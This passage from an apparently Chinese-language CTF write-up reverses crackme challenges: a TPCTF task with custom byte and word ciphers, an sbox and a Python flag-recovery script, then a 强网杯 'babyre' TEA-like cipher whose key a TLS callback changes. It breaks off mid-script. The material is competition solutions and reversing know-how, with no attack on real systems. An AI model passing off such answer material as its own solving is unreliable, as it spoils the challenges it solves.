<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">expr_table(<span class="string">&#x27;-(x - y) - (y - x)&#x27;</span>) <span class="comment"># xor</span></span><br><span class="line">expr_table(<span class="string">&#x27;-(-x - y)&#x27;</span>) <span class="comment"># and</span></span><br><span class="line">expr_table(<span class="string">&#x27;-(-(-(x - y) - (y - x)) - n) - (-x - y)&#x27;</span>) <span class="comment"># carry</span></span><br><span class="line">expr_table(<span class="string">&#x27;-((-(x - y) - (y - x)) - n) - (n - (-(x - y) - (y - x)))&#x27;</span>) <span class="comment"># add</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">-(x - y) - (y - x):</span></span><br><span class="line"><span class="string">    (0, 0) -&gt; 0</span></span><br><span class="line"><span class="string">    (0, 1) -&gt; 1</span></span><br><span class="line"><span class="string">    (1, 0) -&gt; 1</span></span><br><span class="line"><span class="string">    (1, 1) -&gt; 0</span></span><br><span class="line"><span class="string">-(-x - y):</span></span><br><span class="line"><span class="string">    (0, 0) -&gt; 0</span></span><br><span class="line"><span class="string">    (0, 1) -&gt; 0</span></span><br><span class="line"><span class="string">    (1, 0) -&gt; 0</span></span><br><span class="line"><span class="string">    (1, 1) -&gt; 1</span></span><br><span class="line"><span class="string">-(-(-(x - y) - (y - x)) - n) - (-x - y):</span></span><br><span class="line"><span class="string">    (0, 0) -&gt; 0</span></span><br><span class="line"><span class="string">    (0, 1) -&gt; 0</span></span><br><span class="line"><span class="string">    (1, 0) -&gt; 0</span></span><br><span class="line"><span class="string">    (1, 1) -&gt; 1</span></span><br><span class="line"><span class="string">-((-(x - y) - (y - x)) - n) - (n - (-(x - y) - (y - x))):</span></span><br><span class="line"><span class="string">    (0, 0) -&gt; 0</span></span><br><span class="line"><span class="string">    (0, 1) -&gt; 1</span></span><br><span class="line"><span class="string">    (1, 0) -&gt; 1</span></span><br><span class="line"><span class="string">    (1, 1) -&gt; 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>经过调试，得到逻辑：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rax = 0</span></span><br><span class="line"><span class="comment"># index = 0</span></span><br><span class="line"><span class="comment"># t = input[rax + 8]</span></span><br><span class="line"><span class="comment"># index += 1</span></span><br><span class="line"><span class="comment"># rax = (index &amp; 7)</span></span><br><span class="line"><span class="comment"># input[rax] = (sbox[input[0] + t] + input[rax + 8]) &lt;&lt; 1 # 空缺填补溢出</span></span><br><span class="line"><span class="comment"># t = input[rax]</span></span><br><span class="line"><span class="comment"># index += 1</span></span><br><span class="line"><span class="comment"># rax = (index &amp; 7)</span></span><br><span class="line"><span class="comment"># input[rax] = (sbox[input[1] + t] + input[rax + 8]) &lt;&lt; 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_shift</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; n) &amp; <span class="number">0xff</span> | (x &gt;&gt; (<span class="number">8</span> - n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            rax_ = z &amp; <span class="number">7</span></span><br><span class="line">            rax = (z + <span class="number">1</span>) &amp; <span class="number">7</span></span><br><span class="line">            tmp = (sbox[<span class="built_in">input</span>[<span class="number">8</span> * i + z] + <span class="built_in">input</span>[<span class="number">8</span> * i + rax_ + <span class="number">8</span>]]) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="built_in">input</span>[<span class="number">8</span> * i + rax + <span class="number">8</span>] = left_shift((tmp + <span class="built_in">input</span>[<span class="number">8</span> * i + rax + <span class="number">8</span>]) &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>

<h3 id="enc3"><a href="#enc3" class="headerlink" title="enc3"></a>enc3</h3><p><code>enc3</code>就和<code>enc1</code>差不多了，只是他操作的是两个字节的数。</p>
<p>其他都是一样的，过。🆒</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_andbit</span>(<span class="params">num</span>):</span><br><span class="line">    res = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (num &amp; (<span class="number">1</span> &lt;&lt; i)) == (<span class="number">1</span> &lt;&lt; i):</span><br><span class="line">            res[i] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc1</span>(<span class="params">data</span>):</span><br><span class="line">    c_and_bit = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        e = <span class="number">52</span></span><br><span class="line">        b = <span class="number">0</span></span><br><span class="line">        bit = get_andbit(data[i])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            a = e &amp; bit[j]</span><br><span class="line">            b = b ^ a</span><br><span class="line">            c = <span class="number">99</span> &amp; c_and_bit[j]</span><br><span class="line">            e = (e &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line">            e = e ^ c</span><br><span class="line">        data[i] = b ^ <span class="number">227</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_andbit_word</span>(<span class="params">num</span>):</span><br><span class="line">    res = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> (num &amp; (<span class="number">1</span> &lt;&lt; i)) == (<span class="number">1</span> &lt;&lt; i):</span><br><span class="line">            res[i] = <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc3</span>(<span class="params">data</span>):</span><br><span class="line">    c_and_bit = [<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0xffff</span>, <span class="number">0xffff</span>, <span class="number">0xffff</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        e = <span class="number">0x6f08</span></span><br><span class="line">        b = <span class="number">0</span></span><br><span class="line">        bit = get_andbit_word(data[i])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            a = e &amp; bit[j]</span><br><span class="line">            b = b ^ a</span><br><span class="line">            c = <span class="number">0x7481</span> &amp; c_and_bit[j]</span><br><span class="line">            e = (e &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">            e = e ^ c</span><br><span class="line">        data[i] = b ^ <span class="number">0x5edd</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">sbox = [<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_shift</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; n) &amp; <span class="number">0xff</span> | (x &gt;&gt; (<span class="number">8</span> - n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right_shift</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; n) | (x &lt;&lt; (<span class="number">8</span> - n)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc2</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                rax_ = z &amp; <span class="number">7</span></span><br><span class="line">                rax = (z + <span class="number">1</span>) &amp; <span class="number">7</span></span><br><span class="line">                tmp = (sbox[<span class="built_in">input</span>[<span class="number">8</span> * i + z] + <span class="built_in">input</span>[<span class="number">8</span> * i + rax_ + <span class="number">8</span>]]) &amp; <span class="number">0xff</span></span><br><span class="line">                <span class="built_in">input</span>[<span class="number">8</span> * i + rax + <span class="number">8</span>] = left_shift((tmp + <span class="built_in">input</span>[<span class="number">8</span> * i + rax + <span class="number">8</span>]) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 懒得逆了😀 这里借用了其他师傅的dec2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>(<span class="params">data</span>):</span><br><span class="line">    out = <span class="built_in">list</span>(data)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                out[<span class="number">8</span> + <span class="number">8</span> * k + ((j + <span class="number">1</span>) &amp; <span class="number">7</span>) &amp; <span class="number">0x1f</span>] = right_shift(out[<span class="number">8</span> + <span class="number">8</span> * k + ((j + <span class="number">1</span>) &amp; <span class="number">7</span>) &amp; <span class="number">0x1f</span>], <span class="number">1</span>) - sbox[out[<span class="number">8</span> + <span class="number">8</span> * k + (j &amp; <span class="number">7</span>) &amp; <span class="number">0x1f</span>] + out[j + <span class="number">8</span> * k] &amp; <span class="number">0xff</span>] &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result = [</span><br><span class="line">        <span class="number">0x69DA6110F30513BE</span>, <span class="number">0xB564B4894A8B7B39</span>, <span class="number">0xD94585C18415AE32</span>, <span class="number">0xF68893F67CB61DA9</span></span><br><span class="line">    ]</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> result:</span><br><span class="line">        r += <span class="built_in">list</span>(struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, x))</span><br><span class="line"></span><br><span class="line">    enc1_table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        enc1_table[enc1([<span class="built_in">ord</span>(i)])[<span class="number">0</span>]] = <span class="built_in">ord</span>(i)</span><br><span class="line">    enc3_table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000</span>):</span><br><span class="line">        enc3_table[enc3([i])[<span class="number">0</span>]] = i</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        word = enc3_table[r[<span class="number">2</span> * i] | (r[<span class="number">2</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>)]</span><br><span class="line">        flag += [word &amp; <span class="number">0xff</span>, word &gt;&gt; <span class="number">8</span>]</span><br><span class="line">    flag = <span class="built_in">list</span>(decrypt2(flag))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        flag[i] = enc1_table[flag[i]]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;TPCTF&#123;&quot;</span> + <span class="built_in">bytes</span>(flag) + <span class="string">b&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="强网杯"><a href="#强网杯" class="headerlink" title="强网杯"></a>强网杯</h1><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>逻辑很简单，一个类似TEA的加密。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_7FF7A24E2050</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your key:&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, Str, <span class="number">33</span>i64);</span><br><span class="line">    <span class="keyword">if</span> ( j_strlen(Str) == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x20</span>ui64);</span><br><span class="line">        <span class="number">4</span>char_to_1int((__int64)v5, (__int64)Str);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">            tea_dec(&amp;v5[<span class="number">2</span> * j], &amp;v5[<span class="number">2</span> * j + <span class="number">1</span>]);</span><br><span class="line">        sub_7FF7A24E1087((__int64)v5, (__int64)byte_7FF7A24EE218);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; (<span class="type">int</span>)k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( byte_7FF7A24EE040[k] != byte_7FF7A24EE218[k] )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;No No No!!!&quot;</span>);</span><br><span class="line">                sub_7FF7A24E11A9(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Yes!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_7FF7A24E11A9(<span class="string">&quot;Wrong Length!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只是<code>key</code>和<code>result</code>被<code>TLSCallback</code>更改了：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231216163416488.png"></p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231216163639716.png"></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">result = [<span class="number">0xE0</span>, <span class="number">0xF3</span>, <span class="number">0x21</span>, <span class="number">0x96</span>, <span class="number">0x97</span>, <span class="number">0xC7</span>, <span class="number">0xDE</span>, <span class="number">0x89</span>, <span class="number">0x9B</span>, <span class="number">0xCA</span>,</span><br><span class="line">          <span class="number">0x62</span>, <span class="number">0x8D</span>, <span class="number">0xB0</span>, <span class="number">0x5D</span>, <span class="number">0xFC</span>, <span class="number">0xD2</span>, <span class="number">0x89</span>, <span class="number">0x55</span>, <span class="number">0x1C</span>, <span class="number">0x42</span>,</span><br><span class="line">          <span class="number">0x50</span>, <span class="number">0xA8</span>, <span class="number">0x76</span>, <span class="number">0x9B</span>, <span class="number">0xEA</span>, <span class="number">0xB2</span>, <span class="number">0xC6</span>, <span class="number">0x2F</span>, <span class="number">0x7C</span>, <span class="number">0xCF</span>,</span><br><span class="line">          <span class="number">0x11</span>, <span class="number">0xDE</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i] = result[i] ^ i</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_dec</span>(<span class="params">cipher, key</span>):</span><br><span class="line">    num = (<span class="number">0x90508D47</span> - <span class="number">0x77BF7F99</span> * <span class="number">33</span> * <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">            num = (num + <span class="number">0x77BF7F99</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            cipher[<span class="number">1</span>] -= ((((cipher[<span class="number">0</span>] &lt;&lt; <span class="number">5</span>) ^ (cipher[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>)) + cipher[<span class="number">0</span>]) &amp; <span class="number">0xffffffff</span>) ^ (num + key[(num &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">            cipher[<span class="number">1</span>] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            